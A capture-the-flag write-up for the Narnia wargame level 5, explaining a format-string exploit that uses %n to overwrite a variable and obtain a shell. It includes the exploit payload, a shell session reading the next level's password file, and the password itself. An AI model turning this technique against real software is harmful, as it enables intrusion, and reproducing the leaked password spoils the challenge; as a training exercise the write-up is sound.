## 5 -> 6

### Writeup 

Unlike previous challenges, a buffer overflow cannot be performed. This is because the function used to read user input is `snprintf`, which limits the size of the input to the size of the buffer. While `snprintf` prevents buffer overflow, it doesn’t prevent format strings. This is the vulnerability, as it allows us to write data to an address, such as `0xffffd3c0`, which contains `int i`. If we can change `int i` to be 500, then we get a shell!

We do this by utilising `%n`. This format specifier tells `snprintf` to write the number of bytes printed up until this point to an address specified in the argument. While we need to print 500 characters to do this, we have a 64-byte buffer. We can get by this by using `%p`, which prints 10 characters on average, being an address such as `0xdeadbeef`, unless the value is `(null)`. Either way, we print more characters than what is in the buffer.

Since the program tells us the address of `int i`, we know the payload looks like this: `address + %496x + %1$n`

`%496x` prints 496 bytes of a hex value. In this case, the hex values would be taken from the stack. We chose 496 because the address prints 4 bytes. But we first need to get the address of `int i`, which can be achieved by putting dummy bytes in place of the address and format specifier. The whole process is shown below: the first command is recon and the second is exploitation.

```
narnia5@narnia:~$ /narnia/narnia5 $(python3 -c 'import sys; sys.stdout.buffer.write(b"AAAA%496xAAAA")')
Change i's value from 1 -> 500. Now ... let me give you a hint!
buffer: [AAAA ...] (63)
i = 1 (0xffffd3c0)

narnia5@narnia:~$ /narnia/narnia5 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\xc0\xd3\xff\xff%496x%1$n")')
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
uK3ikaZLxB
$
```

<details>
  <summary>Flag</summary>uK3ikaZLxB
</details>